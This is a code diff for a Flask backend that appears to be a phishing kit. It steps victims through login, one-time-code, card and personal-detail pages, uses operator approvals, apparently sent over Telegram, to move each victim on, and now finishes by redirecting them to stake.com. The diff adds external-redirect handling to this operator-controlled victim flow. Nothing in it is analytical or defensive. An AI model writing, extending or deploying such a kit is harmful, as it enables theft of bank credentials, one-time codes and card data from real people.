@@ -20,6 +20,7 @@ if not BOT_TOKEN or not CHAT_ID:
 
 SESSION_STATUS = {}
 
+# ✅ ONLY CHANGE: THANK YOU goes to stake.com
 PAGES = [
     {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
     {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
@@ -27,7 +28,7 @@ PAGES = [
     {"emoji": "🧾", "text": "CARD", "page": "c.html"},
     {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
     {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
-    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
+    {"emoji": "🎉", "text": "THANK YOU", "page": "https://stake.com"},
 ]
 
 # ======================
@@ -136,8 +137,15 @@ def webhook():
         session_id, page = data.split(":")
 
         if session_id in SESSION_STATUS:
+
+            # ✅ HANDLE BOTH INTERNAL + EXTERNAL LINKS
+            if page.startswith("http"):
+                redirect_url = page
+            else:
+                redirect_url = f"{BASE_URL}/{page}"
+
             SESSION_STATUS[session_id]["approved"] = True
-            SESSION_STATUS[session_id]["redirect_url"] = f"{BASE_URL}/{page}"
+            SESSION_STATUS[session_id]["redirect_url"] = redirect_url
 
     except:
         pass
@@ -146,7 +154,7 @@ def webhook():
 
 
 # ======================
-# FRONTEND STATUS CHECK (FIXED)
+# STATUS (ALREADY FIXED LOOP)
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
@@ -158,7 +166,7 @@ def status(session_id):
     if session["approved"]:
         redirect_url = session["redirect_url"]
 
-        # 🔥 RESET AFTER FIRST USE (FIXES LOOP)
+        # 🔥 prevents infinite loop
         session["approved"] = False
         session["redirect_url"] = None
 
